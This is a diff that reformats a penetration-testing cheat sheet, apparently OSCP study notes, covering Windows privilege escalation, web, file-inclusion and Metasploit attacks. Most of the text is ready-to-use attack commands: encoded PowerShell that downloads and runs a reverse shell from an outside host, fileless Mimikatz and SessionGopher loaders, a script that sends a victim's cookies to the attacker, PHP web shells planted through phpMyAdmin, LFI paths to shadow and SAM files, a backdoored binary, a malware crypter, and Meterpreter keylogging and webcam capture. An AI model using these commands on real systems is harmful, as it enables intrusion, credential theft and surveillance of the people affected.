@@ -2177,8 +2177,7 @@ Prior to successfully performing a Windows run as, we of course need a valid win
     **If this method doesn't work, change the command to base64 little endian sometimes it works!**
     - `echo "IEX( IWR http://10.10.14.19:8000/rev.ps1 -UseBasicParsing)" | iconv -t utf-16le|base64 -w 0`
     - `sc.exe config UsoSvc binpath="powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`
-    Or
-    - `sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`
+    - Or `sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`
 
 - Compile a custom add user command in windows using C  
 
@@ -2198,14 +2197,10 @@ Prior to successfully performing a Windows run as, we of course need a valid win
 - Group Policy Preferences (GPP) 
 
 A common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files
-  - map the Domain controller SYSVOL share  
-    - `net use z:\\dc01\SYSVOL`
-  - Find the GPP file: Groups.xml  
-    - `dir /s Groups.xml`
-  - Review the contents for passwords  
-    - `type Groups.xml`
-  - Decrypt using GPP Decrypt  
-    - `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
+  - map the Domain controller SYSVOL share `net use z:\\dc01\SYSVOL`
+  - Find the GPP file: Groups.xml `dir /s Groups.xml`
+  - Review the contents for passwords `type Groups.xml`
+  - Decrypt using GPP Decrypt  `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
 - Find and display the proof.txt or flag.txt - get the loot!
     
     ```shell
@@ -2285,19 +2280,17 @@ On our Kali machine we create the reverse shell and ... BOOM! Root dance.
 ### Potato Attacks
 
 #### RottenPotato
-Service accounts usually have special privileges (SeImpersonatePrivileges) and this could be used to escalate privileges.
-
-<https://github.com/breenmachine/RottenPotatoNG>
+Service accounts usually have special privileges (SeImpersonatePrivileges) and this could be used to escalate privileges. <https://github.com/breenmachine/RottenPotatoNG>
 
 #### Juicy Potato
 
 When you have **SeImpersonate** or **SeAssignPrimaryToken** privileges available within windows; you can carry out Juict Potato Attack. We can do a `whoami /priv` to get an indication of privs:
 
-```text
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled
-```
-Which means `JuicyPotato.exe` is a good method of escalation. 
+  ```text
+  SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+  ```
 
+Which means `JuicyPotato.exe` is a good method of escalation: 
 - Download the JuicyPotato Binary from: <https://github.com/ohpe/juicy-potato>
 - Let's download it to the victim machine via:
    `(new-object net.webclient).downloadfile('http://10.10.14.10/jp.exe', 'C:\users\merlin\desktop\jp.exe')`
@@ -2332,8 +2325,7 @@ Leveraging credentials is still the most common ways of privledge escalation in 
   `IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/SessionGopher.ps1')`
 - Or we can download and run it:
   `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/SessionGopher.ps1\", \"C:\\Users\\Public\\Downloads\\SessionGopher.ps1\");`
-  and
-  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "& { . .\SessionGopher.ps1; Invoke-SessionGopher -Thorough}"`
+- and `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "& { . .\SessionGopher.ps1; Invoke-SessionGopher -Thorough}"`
 
 
 ### Running Mimikatz
@@ -2371,208 +2363,165 @@ The original and most frequently updated version of Mimikatz is the binary execu
 #### Running Powershell Mimikatz
 
 The Powershell version is not as frequently updated, but can be loaded into memory without ever hitting the HDD (Fileless execution). This version simply reflectively loads the Mimikatz binary into memory so we could probably update it ourselves without much difficulty.
-  `wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1`
-
-- Fileless execution of Mimikatz from remotely hosted server:
-  `IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`
+  - `wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1`
+  - Fileless execution of Mimikatz from remotely hosted server:
+    - `IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`
 
 ### Capture a screen shot
 
 The following powershell commands can be used to capture a screen shot of the remote computers desktop and store it as a BMP file.
 
-```powershell
-Add-Type -AssemblyName System.Windows.Forms
-Add-type -AssemblyName System.Drawing
-$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
-$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
-$bitmap.Save('screen1.bmp')
-```
+  ```powershell
+  Add-Type -AssemblyName System.Windows.Forms
+  Add-type -AssemblyName System.Drawing
+  $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+  $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
+  $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+  $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
+  $bitmap.Save('screen1.bmp')
+  ```
 
-- If you are on CMD you can use this handy one-liner to execute the same powershell command
-
-`@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size); $bitmap.Save('screen1.bmp')"`
+- If you are on CMD you can use this handy one-liner to execute the same powershell command:
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size); $bitmap.Save('screen1.bmp')"`
 
 ## Client, Web and Password Attacks
 
 ### Client Attacks
 
 - MS12-037- Internet Explorer 8 Fixed Col Span ID  
-      wget -O exploit.html
-      <http://www.exploit-db.com/download/24017>  
-      service apache2 start
+  - `wget -O exploit.html <http://www.exploit-db.com/download/24017>`
+  - `service apache2 start`
 - JAVA Signed Jar client side attack  
-      echo '<applet width="1" height="1" id="Java Secure"
-      code="Java.class" archive="SignedJava.jar"><param name="1"
-      value="http://$ip:80/evil.exe"></applet>' >
-      /var/www/html/java.html  
-      User must hit run on the popup that occurs.
-- Linux Client Shells  
-      [*http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/*](http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
-
+  
+  ```
+  echo '<applet width="1" height="1" id="Java Secure"
+  code="Java.class" archive="SignedJava.jar"><param name="1"
+  value="http://$ip:80/evil.exe"></applet>' >
+  /var/www/html/java.html
+  ```
+  *User must hit run on the popup that occurs.*
+- Linux Client Shells [*http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/*](http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
 - Setting up the Client Side Exploit
-
 - Swapping Out the Shellcode
-
 - Injecting a Backdoor Shell into Plink.exe  
-      backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $ip
-      -P 4444 -s reverse_shell_tcp
+  - `backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $ip -P 4444 -s reverse_shell_tcp`
 
 ### Web Attacks
 
-- Web Shag Web Application Vulnerability Assessment Platform  
-      webshag-gui
-
-- Web Shells  
-      [*http://tools.kali.org/maintaining-access/webshells*](http://tools.kali.org/maintaining-access/webshells)  
-      `ls -l /usr/share/webshells/`
-
+- Web Shag Web Application Vulnerability Assessment Platform `webshag-gui`
+- Web Shells [*http://tools.kali.org/maintaining-access/webshells*](http://tools.kali.org/maintaining-access/webshells)  
+  - `ls -l /usr/share/webshells/`
 - Generate a PHP backdoor (generate) protected with the given
-      password (s3cr3t)  
-      weevely generate s3cr3t  
-      weevely <http://$ip/weevely.php> s3cr3t
-
+  
+  ```text
+  password (s3cr3t)  
+  weevely generate s3cr3t  
+  weevely <http://$ip/weevely.php> s3cr3t
+  ```
 - Java Signed Applet Attack
-
 - HTTP / HTTPS Webserver Enumeration
-
   - OWASP Dirbuster
-
   - nikto -h $ip
-
 - Essential Iceweasel Add-ons  
-      Cookies Manager
-      <https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/>  
-      Tamper Data  
-      <https://addons.mozilla.org/en-US/firefox/addon/tamper-data/>
-
+  - Cookies Manager <https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/>  
+  - Tamper Data  <https://addons.mozilla.org/en-US/firefox/addon/tamper-data/>
 - Cross Site Scripting (XSS)  
-      significant impacts, such as cookie stealing and authentication
-      bypass, redirecting the victim’s browser to a malicious HTML
-      page, and more
-
+  - significant impacts, such as cookie stealing and authentication bypass, redirecting the victim’s browser to a malicious HTML page, and more
 - Browser Redirection and IFRAME Injection
 
-      ```html
-      <iframe SRC="http://$ip/report" height = "0" width="0"></iframe>
-      ```
+  ```html
+  <iframe SRC="http://$ip/report" height = "0" width="0"></iframe>
+  ```
 
 - Stealing Cookies and Session Information
 
-      ```javascript
-      <javascript>  
-      new image().src="http://$ip/bogus.php?output="+document.cookie;  
-      </script>
-      ```
-
-      nc -nlvp 80
+  ```javascript
+  <javascript>  
+  new image().src="http://$ip/bogus.php?output="+document.cookie;  
+  </script>
+  ```
+  - `nc -nlvp 80`
 
 ## File Inclusion Vulnerabilities
 
-- Local (LFI) and remote (RFI) file inclusion vulnerabilities are
-      commonly found in poorly written PHP code.
+- Local (LFI) and remote (RFI) file inclusion vulnerabilities are commonly found in poorly written PHP code.
+- fimap - There is a Python tool called fimap which can be leveraged to automate the exploitation of LFI/RFI vulnerabilities that are found in PHP (sqlmap for LFI): [*https://github.com/kurobeats/fimap*](https://github.com/kurobeats/fimap)
+- Gaining a shell from phpinfo()
+  - fimap + phpinfo() Exploit - If a phpinfo() file is present, it’s usually possible to get a shell, if you don’t know the location of the phpinfo file fimap can probe for it, or you could use a tool like OWASP DirBuster.
+- For Local File Inclusions look for the include() function in PHP code.
 
-- fimap - There is a Python tool called fimap which can be
-      leveraged to automate the exploitation of LFI/RFI
-      vulnerabilities that are found in PHP (sqlmap for LFI):  
-      [*https://github.com/kurobeats/fimap*](https://github.com/kurobeats/fimap)
-
-  - Gaining a shell from phpinfo()  
-          fimap + phpinfo() Exploit - If a phpinfo() file is present,
-          it’s usually possible to get a shell, if you don’t know the
-          location of the phpinfo file fimap can probe for it, or you
-          could use a tool like OWASP DirBuster.
-
-- For Local File Inclusions look for the include() function in PHP
-      code.
-
-      ```php  
-      include("lang/".$_COOKIE['lang']);  
-      include($_GET['page'].".php");
-      ```
+  ```php  
+  include("lang/".$_COOKIE['lang']);  
+  include($_GET['page'].".php");
+  ```
 
 - LFI - Encode and Decode a file using base64  
 
-      ```shell
-      curl -s \
-      "http://$ip/?page=php://filter/convert.base64-encode/resource=index" \
-      | grep -e '\[^\\ \]\\{40,\\}' | base64 -d
-      ```
+  ```shell
+  curl -s \
+  "http://$ip/?page=php://filter/convert.base64-encode/resource=index" \
+  | grep -e '\[^\\ \]\\{40,\\}' | base64 -d
+  ```
 
 - There is a tool called Kadimus to test LFI too
-
 - dotdotpwn is another tool to test for LFI
-
-- LFI - Download file with base 64 encoding  
-      [*http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php*](about:blank)
-
+- LFI - Download file with base 64 encoding [*http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php*](about:blank)
 - LFI Linux Files:  
-      /etc/issue  
-      /proc/version  
-      /etc/profile  
-      /etc/passwd  
-      /etc/passwd  
-      /etc/shadow  
-      /root/.bash_history  
-      /var/log/dmessage  
-      /var/mail/root  
-      /var/spool/cron/crontabs/root
+
+  ```shell
+  /etc/issue  
+  /proc/version  
+  /etc/profile  
+  /etc/passwd  
+  /etc/passwd  
+  /etc/shadow  
+  /root/.bash_history  
+  /var/log/dmessage  
+  /var/mail/root  
+  /var/spool/cron/crontabs/root
+  ```
 
 - LFI Windows Files:  
-      %SYSTEMROOT%\\repair\\system  
-      %SYSTEMROOT%\\repair\\SAM  
-      %SYSTEMROOT%\\repair\\SAM  
-      %WINDIR%\\win.ini  
-      %SYSTEMDRIVE%\\boot.ini  
-      %WINDIR%\\Panther\\sysprep.inf  
-      %WINDIR%\\system32\\config\\AppEvent.Evt
+  
+  ```CMD
+  %SYSTEMROOT%\\repair\\system  
+  %SYSTEMROOT%\\repair\\SAM  
+  %SYSTEMROOT%\\repair\\SAM  
+  %WINDIR%\\win.ini  
+  %SYSTEMDRIVE%\\boot.ini  
+  %WINDIR%\\Panther\\sysprep.inf  
+  %WINDIR%\\system32\\config\\AppEvent.Evt
+  ```
 
 - LFI OSX Files:  
-      /etc/fstab  
-      /etc/master.passwd  
-      /etc/resolv.conf  
-      /etc/sudoers  
-      /etc/sysctl.conf
+  
+  ```shell
+  /etc/fstab  
+  /etc/master.passwd  
+  /etc/resolv.conf  
+  /etc/sudoers  
+  /etc/sysctl.conf
+  ```
 
 - LFI - Download passwords file  
-      [*http://$ip/index.php?page=/etc/passwd*](about:blank)  
-      [*http://$ip/index.php?file=../../../../etc/passwd*](about:blank)
+  - [*http://$ip/index.php?page=/etc/passwd*](about:blank)  
+  - [*http://$ip/index.php?file=../../../../etc/passwd*](about:blank)
 
-- LFI - Download passwords file with filter evasion  
-      [*http://$ip/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd*](about:blank)
-
-- Local File Inclusion - In versions of PHP below 5.3 we can
-      terminate with null byte  
-      GET
-      /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00
-
+- LFI - Download passwords file with filter evasion [*http://$ip/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd*](about:blank)
+- Local File Inclusion - In versions of PHP below 5.3 we can terminate with null byte  
+  - `GET /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00`
 - Contaminating Log Files `<?php echo shell_exec($_GET['cmd']);?>`
+- For a Remote File Inclusion look for php code that is not sanitized and passed to the PHP include function and the php.ini file must be configured to allow remote files 
+  - `*/etc/php5/cgi/php.ini* - "allow_url_fopen" and "allow_url_include" both set to "on"`  
+  - `include($_REQUEST["file"].".php");`
 
-- For a Remote File Inclusion look for php code that is not  sanitized and passed to the PHP include function and the php.ini
-      file must be configured to allow remote files
+- Remote File Inclusion 
+  - `http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt`
+  - `<?php echo shell_exec("ipconfig");?>`
 
-      */etc/php5/cgi/php.ini* - "allow_url_fopen" and "allow_url_include" both set to "on"  
-
-      `include($_REQUEST["file"].".php");`
-
-- Remote File Inclusion  
-
-       `http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt`
-
-       `<?php echo shell_exec("ipconfig");?>`
-
-- Simple shell to upload and execute commands
-
-<?php echo system($_REQUEST['cmd']) ?>
-
-- Drupal Scanner
-
-drupscan
-
-- Joomla Scanner
-
-joomscan
+- Simple shell to upload and execute commands: `<?php echo system($_REQUEST['cmd']) ?>`
+- Drupal Scanner `drupscan`
+- Joomla Scanner `joomscan`
 
 ## Database Vulnerabilities
 
@@ -2944,11 +2893,11 @@ Needed to install new drivers to get my GPU Cracking to work on the Kali linux V
         `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000`
 - VLAN Hopping
 
-      ```shell
-      git clone https://github.com/nccgroup/vlan-hopping.git
-      chmod 700 frogger.sh
-      ./frogger.sh
-      ```
+  ```shell
+  git clone https://github.com/nccgroup/vlan-hopping.git
+  chmod 700 frogger.sh
+  ./frogger.sh
+  ```
 
 - VPN Hacking
   - Identify VPN servers:  
@@ -2984,9 +2933,9 @@ Needed to install new drivers to get my GPU Cracking to work on the Kali linux V
 
 - PPTP Hacking
   - Identifying PPTP, it listens on TCP: 1723  
-        NMAP PPTP Fingerprint:  
+    - NMAP PPTP Fingerprint:  
         `nmap –Pn -sV -p 1723 TARGET(S)`
-        PPTP Dictionary Attack  
+    - PPTP Dictionary Attack  
         `thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst`
 - Port Forwarding/Redirection
 - PuTTY Link tunnel - SSH Tunneling
@@ -2999,22 +2948,22 @@ Needed to install new drivers to get my GPU Cracking to work on the Kali linux V
   - dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.
   - Attacking Machine Installation:
 
-      ```shell
-      apt-get update  
-      apt-get -y install ruby-dev git make g++  
-      gem install bundler  
-      git clone https://github.com/iagox86/dnscat2.git  
-      cd dnscat2/server  
-      bundle install
-      ```
+    ```shell
+    apt-get update  
+    apt-get -y install ruby-dev git make g++  
+    gem install bundler  
+    git clone https://github.com/iagox86/dnscat2.git  
+    cd dnscat2/server  
+    bundle install
+    ```
 
   - Run dnscat2:
 
-      ```shell
-      ruby ./dnscat2.rb  
-      dnscat2> New session established: 1422  
-      dnscat2> session -i 1422
-      ```
+    ```shell
+    ruby ./dnscat2.rb  
+    dnscat2> New session established: 1422  
+    dnscat2> session -i 1422
+    ```
 
   - Target Machine:  
         [*https://downloads.skullsecurity.org/dnscat2/*](https://downloads.skullsecurity.org/dnscat2/)
@@ -3023,36 +2972,29 @@ Needed to install new drivers to get my GPU Cracking to work on the Kali linux V
 
 ## The Metasploit Framework
 
-- See [*Metasploit Unleashed
-    Course*](https://www.offensive-security.com/metasploit-unleashed/)
-    in the Essentials
-
+- See [*Metasploit Unleashed Course*](https://www.offensive-security.com/metasploit-unleashed/)in the Essentials
 - Search for exploits using Metasploit GitHub framework source code:  
-    [*https://github.com/rapid7/metasploit-framework*](https://github.com/rapid7/metasploit-framework)  
-    Translate them for use on OSCP LAB or EXAM.
+    [*https://github.com/rapid7/metasploit-framework*](https://github.com/rapid7/metasploit-framework) Translate them for use on OSCP LAB or EXAM.
 - Metasploit
   - MetaSploit requires Postfresql  
-        `systemctl start postgresql`
+    `systemctl start postgresql`
   - To enable Postgresql on startup  
-        `systemctl enable postgresql`
+    `systemctl enable postgresql`
 - MSF Syntax
-  - Start metasploit  
-        `msfconsole`
-
-        `msfconsole -q`
-  - Show help for command  
-        `show -h`
-  - Show Auxiliary modules  
-        `show auxiliary`
+  - Start metasploit `msfconsole`
+  - `msfconsole -q`
+  - Show help for command `show -h`
+  - Show Auxiliary modules `show auxiliary`
   - Use a module  
 
-        ```
-        use auxiliary/scanner/snmp/snmp_enum  
-        use auxiliary/scanner/http/webdav_scanner  
-        use auxiliary/scanner/smb/smb_version  
-        use auxiliary/scanner/ftp/ftp_login  
-        use exploit/windows/pop3/seattlelab_pass
-        ```
+    ```
+    use auxiliary/scanner/snmp/snmp_enum  
+    use auxiliary/scanner/http/webdav_scanner  
+    use auxiliary/scanner/smb/smb_version  
+    use auxiliary/scanner/ftp/ftp_login  
+    use exploit/windows/pop3/seattlelab_pass
+    ```
+
   - Show the basic information for a module  
         `info`
   - Show the configuration parameters for a module  
@@ -3064,21 +3006,14 @@ Needed to install new drivers to get my GPU Cracking to work on the Kali linux V
         set THREADS 10
         ```
 
-  - Run the module  
-        `run`
-  - Execute an Exploit
-        `exploit`
-  - Search for a module  
-        `search type:auxiliary login`
+  - Run the module `run`
+  - Execute an Exploit `exploit`
+  - Search for a module `search type:auxiliary login`
 - Metasploit Database Access
-  - Show all hosts discovered in the MSF database  
-        `hosts`
-  - Scan for hosts and store them in the MSF database  
-        `db_nmap`
-  - Search machines for specific ports in MSF database
-        `services -p 443`
-  - Leverage MSF database to scan SMB ports (auto-completed rhosts)  
-        `services -p 443 --rhosts`
+  - Show all hosts discovered in the MSF database `hosts`
+  - Scan for hosts and store them in the MSF database `db_nmap`
+  - Search machines for specific ports in MSF database `services -p 443`
+  - Leverage MSF database to scan SMB ports (auto-completed rhosts) `services -p 443 --rhosts`
 - Staged and Non-staged
   - Non-staged payload - is a payload that is sent in its entirety in one go
   - Staged - sent in two parts  Not have enough buffer space  Or need to bypass antivirus
@@ -3099,14 +3034,14 @@ Needed to install new drivers to get my GPU Cracking to work on the Kali linux V
 
 - I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.
 
-      ```shell
-      use exploit/windows/smb/eternalblue_doublepulsar
-      msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
-      RHOST => 10.10.10.10
-      msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
-      PROCESSINJECT => spoolsv.exe
-      msf exploit(eternalblue_doublepulsar) > run
-      ```
+  ```shell
+  use exploit/windows/smb/eternalblue_doublepulsar
+  msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
+  RHOST => 10.10.10.10
+  msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
+  PROCESSINJECT => spoolsv.exe
+  msf exploit(eternalblue_doublepulsar) > run
+  ```
 
 - Experimenting with Meterpreter
   - Get system information from Meterpreter Shell `sysinfo`
@@ -3119,37 +3054,37 @@ Needed to install new drivers to get my GPU Cracking to work on the Kali linux V
 - Metasploit Exploit Multi Handler
   - multi/handler to accept an incoming reverse_https_meterpreter
 
-        ```shell
-        payload  
-        use exploit/multi/handler  
-        set PAYLOAD windows/meterpreter/reverse_https  
-        set LHOST $ip  
-        set LPORT 443  
-        exploit  
-        [*] Started HTTPS reverse handler on https://$ip:443/
-        ```
+    ```shell
+    payload  
+    use exploit/multi/handler  
+    set PAYLOAD windows/meterpreter/reverse_https  
+    set LHOST $ip  
+    set LPORT 443  
+    exploit  
+    [*] Started HTTPS reverse handler on https://$ip:443/
+    ```
 
 - Building Your Own MSF Module
 
-      ```shell
-      mkdir -p ~/.msf4/modules/exploits/linux/misc  
-      cd ~/.msf4/modules/exploits/linux/misc  
-      cp /usr/share/metasploitframework/modules/exploits/linux/misc/gld_postfix.rb ./crossfire.rb  
-      nano crossfire.rb
-      ```
+  ```shell
+  mkdir -p ~/.msf4/modules/exploits/linux/misc  
+  cd ~/.msf4/modules/exploits/linux/misc  
+  cp /usr/share/metasploitframework/modules/exploits/linux/misc/gld_postfix.rb ./crossfire.rb  
+  nano crossfire.rb
+  ```
 
 - Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)
   - `download` Download a file or directory  
-        `upload` Upload a file or directory  
-        `portfwd` Forward a local port to a remote service  
-        `route` View and modify the routing table  
-        `keyscan_start` Start capturing keystrokes  
-        `keyscan_stop` Stop capturing keystrokes  
-        `screenshot` Grab a screenshot of the interactive desktop  
-        `record_mic` Record audio from the default microphone for X seconds  
-        `webcam_snap` Take a snapshot from the specified webcam  
-        `getsystem` Attempt to elevate your privilege to that of local system.  
-        `hashdump` Dumps the contents of the SAM database
+  - `upload` Upload a file or directory  
+  - `portfwd` Forward a local port to a remote service  
+  - `route` View and modify the routing table  
+  - `keyscan_start` Start capturing keystrokes  
+  - `keyscan_stop` Stop capturing keystrokes  
+  - `screenshot` Grab a screenshot of the interactive desktop  
+  - `record_mic` Record audio from the default microphone for X seconds  
+  - `webcam_snap` Take a snapshot from the specified webcam  
+  - `getsystem` Attempt to elevate your privilege to that of local system.  
+  - `hashdump` Dumps the contents of the SAM database
 - Meterpreter Post Exploitation Features
   - Create a Meterpreter background session `background`
 
@@ -3157,15 +3092,15 @@ Needed to install new drivers to get my GPU Cracking to work on the Kali linux V
 
 - Crypting Known Malware with Software Protectors; One such open source crypter, called Hyperion  
 
-    ```shell
-    cp /usr/share/windows-binaries/Hyperion-1.0.zip  
-    unzip Hyperion-1.0.zip  
-    cd Hyperion-1.0/  
-    i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe  
-    cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll .  
-    cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll .  
-    wine hyperion.exe ../backdoor.exe ../crypted.exe
-    ```
+  ```shell
+  cp /usr/share/windows-binaries/Hyperion-1.0.zip  
+  unzip Hyperion-1.0.zip  
+  cd Hyperion-1.0/  
+  i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe  
+  cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll .  
+  cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll .  
+  wine hyperion.exe ../backdoor.exe ../crypted.exe
+  ```
 
 ## Windows Commands for Linux Users
 
@@ -3173,10 +3108,7 @@ Needed to install new drivers to get my GPU Cracking to work on the Kali linux V
 
 ### WAF - Web application firewall
 
-One of the first things we should do when starting to poke on a website is see what WAF it has.
-Identify the WAF
-      `wafw00f <http://example.com>`
-
+One of the first things we should do when starting to poke on a website is see what WAF it has. Identify the WAF `wafw00f <http://example.com>`
 <http://securityidiots.com/Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html>
 
 ### Common web-services
@@ -3187,47 +3119,36 @@ This is a list of some common web-services. The list is alphabetical.
   - If you have found a cold fusion you are almost certainly struck gold. <http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers>
   - Determine version `example.com/CFIDE/adminapi/base.cfc?wsdl` It will say something like:
 
-      ```HTML
-      <!--WSDL created by ColdFusion version 8,0,0,176276-->
-      Version 8
-      FCKEDITOR
-      ```
-
-  - This works for version 8.0.1. So make sure to check the exact version.
-      `use exploit/windows/http/coldfusion_fckeditor`
-- LFI
-    This will output the hash of the password.
+    ```HTML
+    <!--WSDL created by ColdFusion version 8,0,0,176276-->
+    Version 8
+    FCKEDITOR
+    ```
+- This works for version 8.0.1. So make sure to check the exact version. `use exploit/windows/http/coldfusion_fckeditor`
+- LFI: This will output the hash of the password.
     <http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en>
 
 - You can pass the hash.
-    <http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers>
-    <http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/>
+  - <http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers>
+  - <http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/>
 - neo-security.xml and password.properties
 - Drupal
   - droopescan
   - After log in, go to modules -> PHP Filter to enable php code execution ( Web Pages )
 - Elastix
-  - Full of vulnerabilities. The old versions at least.
-    <http://example.com/vtigercrm/> default login is admin:admin
-    You might be able to upload shell in profile-photo.
+  - Full of vulnerabilities. The old versions at least. <http://example.com/vtigercrm/> default login is `admin:admin` You might be able to upload shell in profile-photo.
 - Joomla
     `joomscan`
-
 - Phpmyadmin
-      Default credentials
-      root <blank>
-      pma <blank>
+      Default credentials: `root <blank> : pma <blank>`
   - If you find a phpMyAdmin part of a site that does not have any authentication, or you have managed to bypass the authetication you can use it to upload a shell.
     - You go to: <http://192.168.1.101/phpmyadmin/>
     - Then click on SQL.
     - Run SQL query/queries on server "localhost":
     - From here we can just run a sql-query that creates a php script that works as a shell So we add the following query:
-
-      `SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"`
-
+      - `SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"`
     - For linux:
-
-      `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"`
+      - `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"`
     - The query is pretty self-explanatory. Now you just visit `192.168.1.101/shell.php?cmd=ipconfig` and you have a working web-shell. We can of course just write a superlong query with a better shell. But sometimes it is easier to just upload a simple web-shell, and from there download a better shell.
   - Download a better shell
   - On linux-machines we can use wget to download a more powerful shell.
@@ -3238,19 +3159,17 @@ This is a list of some common web-services. The list is alphabetical.
